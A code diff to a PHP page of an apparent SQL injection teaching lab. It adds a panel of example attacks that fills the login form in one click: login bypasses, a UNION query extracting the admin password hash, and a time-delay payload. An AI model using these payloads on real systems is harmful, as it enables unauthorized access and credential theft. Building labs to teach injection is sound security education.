@@ -20,8 +20,9 @@ if (isset($_SESSION["id"]) && isset($_SESSION["username"])) {
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
     <link href="/node_modules/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="/styles/1.css">
+    <link rel="stylesheet" href="/styles/main.css">
     <title>SQL Injections Lab | 2</title>
 </head>
 
@@ -61,6 +62,71 @@ if (isset($_SESSION["id"]) && isset($_SESSION["username"])) {
         </label>
     </div>
 
+    <?php if($showAttackBank): ?>
+    <div class="p-2 position-absolute bottom-0 start-0 ms-2 mb-2 acordion" style="width: 350px;" id="examples">
+        <div class="accordion-item">
+            <h2 class="accordion-header" id="example1">
+                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
+                    Login as a random user
+                </button>
+            </h2>
+            <div class="container">
+                <div id="collapseOne" class="accordion-collapse collapse hide row" aria-labelledby="example1" data-bs-parent="#examples">
+                    <div class="accordion-body col">' OR 1=1--</div>
+                    <button class="btn btn-light col-2" onclick="fillInCode('\' OR 1=1--')">
+                        <i class="bi bi-chevron-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        <div class="accordion-item">
+            <h2 class="accordion-header" id="example2">
+                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
+                    Login as admin user
+                </button>
+            </h2>
+            <div class="container">
+                <div id="collapseTwo" class="accordion-collapse collapse hide row" aria-labelledby="example2" data-bs-parent="#examples">
+                    <div class="accordion-body col">admin' --</div>
+                    <button class="btn btn-light col-2" onclick="fillInCode('admin\' --')">
+                        <i class="bi bi-chevron-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        <div class="accordion-item">
+            <h2 class="accordion-header" id="example3">
+                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
+                    Get admin user password hash
+                </button>
+            </h2>
+            <div class="container">
+                <div id="collapseThree" class="accordion-collapse collapse hide row" aria-labelledby="example3" data-bs-parent="#examples">
+                    <div class="accordion-body col">' UNION SELECT 1, password, 1 FROM users WHERE username = 'admin'--</div>
+                    <button class="btn btn-light col-2" onclick="fillInCode('\' UNION SELECT 1, password, 1 FROM users WHERE username = \'admin\'--')">
+                        <i class="bi bi-chevron-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        <div class="accordion-item">
+            <h2 class="accordion-header" id="example4">
+                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour">
+                    Make the website sleep for 3 seconds
+                </button>
+            </h2>
+            <div class="container">
+                <div id="collapseFour" class="accordion-collapse collapse hide row" aria-labelledby="example4" data-bs-parent="#examples">
+                    <div class="accordion-body col">' OR 123=LIKE('ABCDEFG',<br/>UPPER(HEX(RANDOMBLOB(<br/>300000000/2))))--</div>
+                    <button class="btn btn-light col-2" onclick="fillInCode('\' OR 123=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(300000000/2))))--')">
+                        <i class="bi bi-chevron-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <?php endif ?>
+
     <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-U1DAWAznBHeqEIlVSCgzq+c9gqGAJn5c/t99JyeKa9xxaYpSvHU5awsuZVVFIhvj" crossorigin="anonymous"></script>
 
@@ -71,6 +137,13 @@ if (isset($_SESSION["id"]) && isset($_SESSION["username"])) {
                 displayQuery(query);
                 sessionStorage.removeItem("lastQuery");
             }
+        }
+
+        function fillInCode(code) {
+            username = document.getElementById("username");
+            password = document.getElementById("password");
+            username.value = code;
+            password.value = "a"
         }
 
         function displayQuery(query) {
